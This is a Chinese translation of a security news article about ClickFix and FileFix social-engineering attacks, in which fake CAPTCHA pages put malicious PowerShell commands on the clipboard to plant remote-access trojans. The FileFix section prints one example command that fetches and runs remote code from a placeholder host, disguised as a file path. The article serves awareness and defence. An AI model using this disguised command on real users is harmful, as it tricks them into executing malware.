---
title: 直击真实 ClickFix 攻击现场：一场社会工程学黑客攻击的全过程
url: https://www.anquanke.com/post/id/310802
source: 安全客-有思想的安全新媒体
date: 2025-08-02
fetch_date: 2025-10-07T00:18:05.809343
---

# 直击真实 ClickFix 攻击现场：一场社会工程学黑客攻击的全过程

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 直击真实 ClickFix 攻击现场：一场社会工程学黑客攻击的全过程

阅读量**87295**

发布时间 : 2025-08-01 17:06:58

**x**

##### 译文声明

本文是翻译文章，文章原作者 Keep Aware，文章来源：bleepingcomputer

原文地址：<https://www.bleepingcomputer.com/news/security/inside-a-real-clickfix-attack-how-this-social-engineering-hack-unfolds/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()

## ClickFix：悄无声息的剪贴板劫持

ClickFix 是一种具有欺骗性的社交工程手法，攻击者借此诱导毫无防备的用户，在不知情的情况下，让网页静默篡改剪贴板内容。

攻击者的最终目标，是诱导用户在本地设备上执行从浏览器复制而来的恶意代码。这一攻击手法最初被命名为“ClickFix”，是因为页面通过社工提示让用户点击某个元素以“修复浏览器问题”，点击后页面就会将恶意代码写入剪贴板，并指示用户将其粘贴进终端执行。

![]()

*伪装成验证码提示的 ClickFix 攻击相关图片*

例如，某些攻击页面会伪装成验证码验证界面。用户点击“验证码”后，页面会悄悄将恶意代码写入剪贴板，并提示用户为了验证身份，将其粘贴到 Windows 的“运行”窗口中。

## 真实案例：从搜索结果跳转到 ClickFix 攻击现场

一家 Keep Aware 的客户在浏览搜索结果时，不慎点击了一个被入侵的网站。该网站植入了恶意 JavaScript 脚本，展示出 ClickFix 弹窗，企图通过用户执行剪贴板中的 PowerShell 命令，植入 NetSupportManager 远控后门。

所幸，Keep Aware 的防护系统及时识别并阻止了剪贴板中的可疑命令，并对用户发出预警，避免了设备被入侵的风险。

该攻击页面会加载一个伪造的 CAPTCHA 验证框，诱导用户点击。一旦点击，JavaScript 就将恶意 PowerShell 命令写入剪贴板，并诱导用户粘贴到 Windows 的“运行”对话框中。

若无防护机制，用户一旦执行这些命令，就会触发一连串下载、解密、恶意程序组装的过程，并将恶意程序设置为开机自启，持久驻留在系统中。

## 影响范围：远控木马、信息窃取器等

ClickFix 攻击结合了恶意 JavaScript、剪贴板劫持与社交工程技术，旨在从浏览器跳转到主机控制。

此攻击已被多起真实案例记录在案，常出现在恶意站点或被劫持的网站上，多个攻击团伙利用它将各种恶意软件和远程访问木马（RAT）植入用户设备，如 AsyncRAT、Skuld Stealer、Lumma Stealer、DarkGate 恶意软件、DanaBot 窃取器等。

如果缺乏技术防护，这类表面简单的剪贴板攻击，最终可能发展为完整系统的失控，不仅让攻击者远程控制设备，还可能造成敏感数据泄露和系统长期感染。

## 下一代攻击方式：FileFix

FileFix 是 ClickFix 的“变种”，一种新型的剪贴板攻击方式，旨在引导用户在浏览器外部执行命令。该攻击首次由安全研究员 mr.d0x 于今年 6 月下旬披露，如今已有攻击者开始部署。

与 ClickFix 不同，FileFix 并不是让用户粘贴到终端，而是诱导用户将剪贴板内容粘贴进 **Windows 文件资源管理器的地址栏**。表面上看像是一个正常路径，但前面隐藏的是恶意命令，后面的路径则被伪装成注释。

例如：

```
Powershell.exe -c "iwr malicious[.]site/mal.jpg|iex" # C:\Organization\Internal\Drive\Business-RFP.pdf
```

用户看到的只是一个熟悉的“文件路径”，但实际上，这是一条完整的 PowerShell 恶意命令，被注释掩盖的文件路径只是一种伪装。

![]()

*由 Chrome 标签页打开的文件资源管理器*

这一攻击同样起源于浏览器，通过社交工程和剪贴板操控，在用户不设防的操作中完成攻击。FileFix 实质上是专为文件资源管理器定制的 ClickFix。

两者共同点包括：

* 都发生在浏览器上下文中；
* 都使用剪贴板注入技术；
* 都依赖恶意或被劫持的网页传播；
* 都能将攻击延伸到宿主设备。

因此，阻止 FileFix 的方法也和 ClickFix 相同：部署浏览器原生防护机制。例如 Keep Aware 提供的解决方案，可实时监测剪贴板活动，拦截可疑内容，防止攻击代码到达主机。

## 浏览器安全成为主战场

ClickFix 与 FileFix 攻击暴露出一个许多传统安全策略的盲点：**浏览器成为攻击者入侵主机的通道**。

这类基于剪贴板的攻击，利用了用户对网页的信任和对交互流程的依赖，一旦组织无法掌控浏览器层的安全，就难以及时发现攻击征兆。而部署具备浏览器可见性与实时防护能力的解决方案，是应对此类攻击的关键。

Keep Aware 发现，传统安全工具往往难以覆盖浏览器层，而浏览器正是员工日常工作与攻击者活动的交汇点。因此构建了专门的平台，实时监控剪贴板操作等浏览器行为，在攻击到达主机之前加以拦截。

本文翻译自bleepingcomputer [原文链接](https://www.bleepingcomputer.com/news/security/inside-a-real-clickfix-attack-how-this-social-engineering-hack-unfolds/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/310802](/post/id/310802)

安全KER - 有思想的安全新媒体

本文转载自: [bleepingcomputer](https://www.bleepingcomputer.com/news/security/inside-a-real-clickfix-attack-how-this-social-engineering-hack-unfolds/)

如若转载,请注明出处： <https://www.bleepingcomputer.com/news/security/inside-a-real-clickfix-attack-how-this-social-engineering-hack-unfolds/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**5赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **545**

* 粉丝
* **5**

### TA的文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33

### 相关文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28

### 热门推荐

文章目录

* [ClickFix：悄无声息的剪贴板劫持](#h2-0)
* [真实案例：从搜索结果跳转到 ClickFix 攻击现场](#h2-1)
* [影响范围：远控木马、信息窃取器等](#h2-2)
* [下一代攻击方式：FileFix](#h2-3)
* [浏览器安全成为主战场](#h2-4)

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)